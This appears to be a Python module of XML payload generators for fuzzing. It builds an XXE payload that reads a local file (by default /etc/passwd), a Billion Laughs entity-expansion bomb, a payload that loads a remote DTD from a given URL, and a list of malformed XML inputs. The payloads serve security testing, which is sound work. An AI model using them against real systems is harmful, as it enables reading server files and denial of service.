"""XML payload generators for fuzzing."""


def generate_xxe_payload(target_path: str = "/etc/passwd") -> str:
    """Return an XXE payload that reads *target_path*."""
    return (
        "<?xml version='1.0' encoding='UTF-8'?>"
        "<!DOCTYPE foo ["
        f"<!ENTITY xxe SYSTEM 'file://{target_path}'>"
        "]>"
        "<user>&xxe;</user>"
    )


def generate_billion_laughs() -> str:
    """Return a classic Billion Laughs (XML bomb) payload with depth 6."""
    entities = "\n".join(f"<!ENTITY l{i} '&l{i - 1};&l{i - 1};&l{i - 1};'>" for i in range(1, 7))
    return (
        "<?xml version='1.0' encoding='UTF-8'?>"
        "<!DOCTYPE lolz ["
        "<!ENTITY lol 'lol'>"
        f"{entities}"
        "]>"
        "<lolz>&l6;</lolz>"
    )


def generate_external_dtd(dtd_url: str) -> str:
    """Return an XXE payload that loads a remote DTD from *dtd_url*."""
    return (
        "<?xml version='1.0' encoding='UTF-8'?>"
        f"<!DOCTYPE foo SYSTEM '{dtd_url}'>"
        "<user><name>&foo;</name></user>"
    )


def generate_malformed_xml() -> list[str]:
    """Return a list of malformed XML payloads."""
    return [
        "",
        "not xml",
        "<root>",
        "<root></root",
        "<root>&</root>",
        "<root>&#x0;</root>",
        "<root><![CDATA[</root>",
        '<!DOCTYPE html [<!ENTITY x "&y;">]><root>&x;</root>',
        "<?xml version='1.0'?><root/>",
        "<root>" + "A" * 100000 + "</root>",
    ]
